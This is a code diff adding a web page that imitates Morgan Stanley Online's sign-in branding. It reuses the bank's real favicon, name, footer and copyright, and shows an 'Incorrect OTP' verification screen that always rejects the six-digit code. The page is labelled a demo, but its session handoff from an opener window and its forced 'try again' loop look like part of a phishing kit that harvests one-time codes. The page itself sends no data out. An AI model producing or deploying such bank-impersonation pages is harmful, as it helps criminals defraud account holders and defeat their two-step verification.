@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=11">
+    <link rel="icon" type="image/x-icon" href="https://login.morganstanleyclientserv.com/ux/favicon.ico">
+    <meta name="viewport" content="initial-scale=1,maximum-scale=1">
+    <title>Morgan Stanley Online - Incorrect OTP</title>
+    <!-- External CSS file (same style) -->
+    <link rel="stylesheet" href="style.css">
+    <!-- Additional styles specific to OTP page (kept minimal as requested) -->
+    <style>
+        /* OTP specific styles that weren't in the main style.css */
+        .otp-subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        .otp-subtitle strong {
+            color: #002b51;
+        }
+        
+        /* OTP Input Group */
+        .otp-group {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .otp-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            border: 1px solid #dadada;
+            border-radius: 8px;
+            background: white;
+            outline: none;
+            font-family: inherit;
+        }
+        .otp-input:focus {
+            border-color: #187aba;
+            box-shadow: 0 0 0 2px rgba(24, 122, 186, 0.2);
+        }
+        .otp-input.error {
+            border-color: #a00;
+            animation: shake 0.2s ease-in-out 0s 2;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        
+        /* Timer */
+        .timer-text {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin: 20px 0;
+        }
+        .timer-highlight {
+            color: #187aba;
+            font-weight: 700;
+        }
+        
+        .error-message {
+            color: #a00;
+            font-size: 14px;
+            margin-top: 5px;
+            text-align: center;
+            min-height: 20px;
+        }
+        .session-info {
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+            margin-top: 10px;
+        }
+        /* extra style for incorrect demo */
+        .incorrect-badge {
+            background: #a00;
+            color: white;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 20px;
+            display: inline-block;
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+        .demo-note {
+            background: #f8f8f8;
+            border-left: 4px solid #a00;
+            padding: 12px 16px;
+            margin-top: 24px;
+            font-size: 14px;
+            color: #333;
+            border-radius: 4px;
+        }
+        .demo-note strong {
+            color: #a00;
+        }
+    </style>
+</head>
+<body>
+    <!-- Skip to main content link -->
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+
+    <!-- Header -->
+    <div role="banner">
+        <div class="mso-header-container">
+            <div>
+                <svg width="200" height="32" viewBox="0 0 200 32" class="mso-desktop-header" aria-label="Morgan Stanley">
+                    <text x="0" y="24" font-family="Karla, Arial, sans-serif" font-weight="700" font-size="24" fill="#002b51">Morgan Stanley</text>
+                </svg>
+            </div>
+            <nav class="mso-header-nav-bar" aria-label="Main navigation">
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Online Security Center</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Find an Advisor / Branch</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Help + Support</a></div>
+            </nav>
+        </div>
+    </div>
+
+    <!-- Main content -->
+    <main id="main-content" class="login-page">
+        <div class="login_form">
+            <div class="login-row">
+                <!-- Left column: OTP form -->
+                <div class="login-left">
+                    <div class="login-container">
+                        <!-- INCORRECT OTP DEMO BADGE -->
+                        <div style="text-align:center;">
+                            <span class="incorrect-badge">⚠️ INCORRECT OTP DEMO</span>
+                        </div>
+                        <h2>Verify Your Identity</h2>
+                        <div class="otp-subtitle">
+                            Enter the 6-digit code sent to<br>
+                            <strong>••• ••• ••12</strong> <!-- masked phone/email -->
+                        </div>
+
+                        <!-- OTP Form -->
+                        <form id="otpForm">
+                            <div class="form-row">
+                                <div class="otp-group" id="otpGroup">
+                                    <input type="text" class="otp-input error" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp1" autocomplete="off" aria-label="First digit" value="1">
+                                    <input type="text" class="otp-input error" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp2" autocomplete="off" aria-label="Second digit" value="2">
+                                    <input type="text" class="otp-input error" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp3" autocomplete="off" aria-label="Third digit" value="3">
+                                    <input type="text" class="otp-input error" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp4" autocomplete="off" aria-label="Fourth digit" value="4">
+                                    <input type="text" class="otp-input error" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp5" autocomplete="off" aria-label="Fifth digit" value="5">
+                                    <input type="text" class="otp-input error" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp6" autocomplete="off" aria-label="Sixth digit" value="6">
+                                </div>
+                                <div id="otpError" class="error-message" style="color:#a00;font-weight:600;">Incorrect code. Please try again.</div>
+                            </div>
+                            
+                            <!-- Timer -->
+                            <div class="timer-text" id="timer">
+                                Code expires in <span class="timer-highlight" id="timerDisplay">04:32</span>
+                            </div>
+                            
+                            <div class="form-row text-center">
+                                <button type="submit" class="btn-login" id="verifyBtn" disabled>
+                                    <span id="btnText">Verify</span>
+                                    <span id="btnSpinner" class="btn-spinner hidden"></span>
+                                </button>
+                            </div>
+                            <div class="form-row text-center">
+                                <button type="button" class="btn-secondary" id="resendBtn" onclick="resendCode()" disabled>
+                                    Resend code
+                                </button>
+                            </div>
+                        </form>
+
+                        <!-- Session info (hidden by default) -->
+                        <div id="sessionInfo" class="session-info hidden"></div>
+
+                        <!-- Alternative options -->
+                        <div class="forgot-row">
+                            <div class="forgot-item">
+                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='index.html';">Back to login</button>
+                            </div>
+                            <div class="forgot-item">
+                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='#';">Use another method</button>
+                            </div>
+                        </div>
+
+                        <!-- Demo note -->
+                        <div class="demo-note">
+                            <strong>🔴 Incorrect OTP demo</strong> – This page simulates an invalid OTP submission. All fields are pre-filled with "123456" and show error state.
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right column: Banner (exact match) -->
+                <div class="login-right">
+                    <div class="banner">
+                        <div class="banner-content">
+                            <h3>Secure Access.<br>Two-Step Verification.</h3>
+                            <p>Protecting your account with an extra layer of security</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="ms-footer">
+            <div class="footer-content">
+                <div class="footer-columns">
+                    <div class="footer-column">
+                        <h4>Need Help?</h4>
+                        <div class="footer-links">
+                            <a href="#">Help + Support</a>
+                            <a href="#" class="mobile-only">Find an Advisor/Branch</a>
+                            <a href="#">Tutorial Videos</a>
+                            <a href="#" class="desktop-only">Co-Browse</a>
+                            <a href="#" class="mobile-only">Mobile Privacy Notice</a>
+                        </div>
+                    </div>
+                    <div class="footer-column footer-column-large">
+                        <h4>Legal</h4>
+                        <div class="footer-links">
+                            <a href="#">Online Security</a>
+                            <a href="#">Terms of Use</a>
+                            <a href="#">U.S. Patriot Act</a>
+                            <a href="#">Morgan Stanley Smith Barney LLC Financial Statement</a>
+                            <a href="#">Morgan Stanley & Co. LLC Financial Statement</a>
+                            <a href="#">Research Disclosures</a>
+                            <a href="#">FINRA Rule 4340</a>
+                            <a href="#">Rate Monitor</a>
+                            <a href="#">Morgan Stanley Smith Barney LLC Business Continuity Information</a>
+                            <a href="#">Investor Resources</a>
+                        </div>
+                    </div>
+                    <div class="footer-column desktop-only">
+                        <h4>Privacy</h4>
+                        <div class="footer-links">
+                            <a href="#">US Privacy Policy</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer-copyright">
+                    © Morgan Stanley Smith Barney LLC, Member <a href="#">SIPC</a>. All rights reserved.
+                </div>
+            </div>
+        </footer>
+    </main>
+
+<script>
+    // DOM elements
+    const otpInputs = document.querySelectorAll('.otp-input');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const otpForm = document.getElementById('otpForm');
+    const btnText = document.getElementById('btnText');
+    const btnSpinner = document.getElementById('btnSpinner');
+    const otpError = document.getElementById('otpError');
+    const timerDisplay = document.getElementById('timerDisplay');
+    const resendBtn = document.getElementById('resendBtn');
+    const sessionInfo = document.getElementById('sessionInfo');
+    
+    // Get session ID from URL or sessionStorage
+    const urlParams = new URLSearchParams(window.location.search);
+    let sessionId = urlParams.get('sessionId') || sessionStorage.getItem('loginSessionId');
+    
+    if (!sessionId && window.opener) {
+        try {
+            sessionId = window.opener.sessionStorage.getItem('loginSessionId');
+        } catch(e) {
+            console.log('Could not access opener session');
+        }
+    }
+    
+    if (sessionId) {
+        sessionStorage.setItem('otpSessionId', sessionId);
+        sessionInfo.textContent = `Session: ${sessionId.substring(0,8)}...`;
+        sessionInfo.classList.remove('hidden');
+    } else {
+        sessionId = 'demo-session-' + Math.random().toString(36).substring(7);
+        sessionStorage.setItem('otpSessionId', sessionId);
+        console.log('Generated new session:', sessionId);
+    }
+
+    // Timer variables
+    let timeLeft = 272; // 4:32 as shown
+    let timerInterval;
+    let resendTimerInterval;
+    let resendCooldown = 60;
+    let pollingInterval;
+
+    // Init OTP inputs (with pre-filled error state)
+    function initOTPInputs() {
+        otpInputs.forEach((input, index) => {
+            // Already have values "123456" and error class
+            input.addEventListener('input', (e) => {
+                input.value = input.value.replace(/[^0-9]/g, '');
+                if (input.value && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+                checkOTPComplete();
+                // Keep error state visible for demo
+                if (!input.classList.contains('error')) {
+                    input.classList.add('error');
+                }
+                // Show error message if any field changes
+                if (otpError.textContent === '') {
+                    otpError.textContent = 'Incorrect code. Please try again.';
+                    otpError.style.color = '#a00';
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const paste = e.clipboardData.getData('text');
+                const numbers = paste.replace(/[^0-9]/g, '').split('');
+                numbers.forEach((num, i) => {
+                    if (i + index < otpInputs.length) {
+                        otpInputs[i + index].value = num;
+                        otpInputs[i + index].classList.add('error');
+                    }
+                });
+                const lastIndex = Math.min(index + numbers.length, otpInputs.length - 1);
+                otpInputs[lastIndex].focus();
+                checkOTPComplete();
+                otpError.textContent = 'Incorrect code. Please try again.';
+                otpError.style.color = '#a00';
+            });
+        });
+    }
+
+    function checkOTPComplete() {
+        const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
+        verifyBtn.disabled = true; // always disabled in incorrect demo
+        return allFilled;
+    }
+
+    function getOTPCode() {
+        return Array.from(otpInputs).map(input => input.value).join('');
+    }
+
+    function clearOTPError() {
+        // keep error for demo
+    }
+
+    function showOTPError(message) {
+        otpError.textContent = message;
+        otpError.style.color = '#a00';
+        otpInputs.forEach(input => input.classList.add('error'));
+    }
+
+    // Timer functions
+    function startTimer() {
+        if (timerInterval) clearInterval(timerInterval);
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            updateTimerDisplay();
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerDisplay.textContent = 'Expired';
+                verifyBtn.disabled = true;
+                showOTPError('Code expired. Please request a new one.');
+            }
+        }, 1000);
+    }
+
+    function updateTimerDisplay() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    }
+
+    function startResendCooldown() {
+        resendBtn.disabled = true;
+        let cooldown = resendCooldown;
+        if (resendTimerInterval) clearInterval(resendTimerInterval);
+        resendTimerInterval = setInterval(() => {
+            cooldown--;
+            resendBtn.textContent = `Resend code (${cooldown}s)`;
+            if (cooldown <= 0) {
+                clearInterval(resendTimerInterval);
+                resendBtn.disabled = false;
+                resendBtn.textContent = 'Resend code';
+            }
+        }, 1000);
+    }
+
+    async function resendCode() {
+        if (resendBtn.disabled) return;
+        try {
+            timeLeft = 300;
+            updateTimerDisplay();
+            startTimer();
+            startResendCooldown();
+            otpInputs.forEach(input => { input.value = ''; input.classList.add('error'); });
+            otpInputs[0].focus();
+            verifyBtn.disabled = true;
+            otpError.textContent = 'Incorrect code. Please try again.';
+            otpError.style.color = '#a00';
+            console.log('Resend code for session:', sessionId);
+        } catch (error) {
+            console.error('Resend error:', error);
+        }
+    }
+
+    function showButtonSpinner() {
+        btnText.classList.add("hidden");
+        btnSpinner.classList.remove("hidden");
+    }
+
+    function hideButtonSpinner() {
+        btnText.classList.remove("hidden");
+        btnSpinner.classList.add("hidden");
+    }
+
+    // Form submission – always shows incorrect error
+    otpForm.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        if (timeLeft <= 0) {
+            showOTPError('Code expired. Please request a new one.');
+            return;
+        }
+        verifyBtn.disabled = true;
+        showButtonSpinner();
+        // Simulate incorrect OTP response
+        setTimeout(() => {
+            hideButtonSpinner();
+            verifyBtn.disabled = false;
+            // Show error with shake
+            otpInputs.forEach(input => input.classList.add('error'));
+            otpError.textContent = 'Incorrect code. Please try again.';
+            otpError.style.color = '#a00';
+            // Clear inputs after error (like real flow)
+            otpInputs.forEach(input => input.value = '');
+            otpInputs[0].focus();
+            checkOTPComplete();
+        }, 800);
+    });
+
+    // Init
+    initOTPInputs();
+    startTimer();
+    startResendCooldown();
+    // focus first input but it already has value
+    otpInputs[0].focus();
+    // ensure error state is visible
+    otpInputs.forEach(input => input.classList.add('error'));
+    otpError.textContent = 'Incorrect code. Please try again.';
+    otpError.style.color = '#a00';
+
+    window.addEventListener('beforeunload', () => {
+        if (timerInterval) clearInterval(timerInterval);
+        if (resendTimerInterval) clearInterval(resendTimerInterval);
+        if (pollingInterval) clearInterval(pollingInterval);
+    });
+</script>
+</body>
+</html>
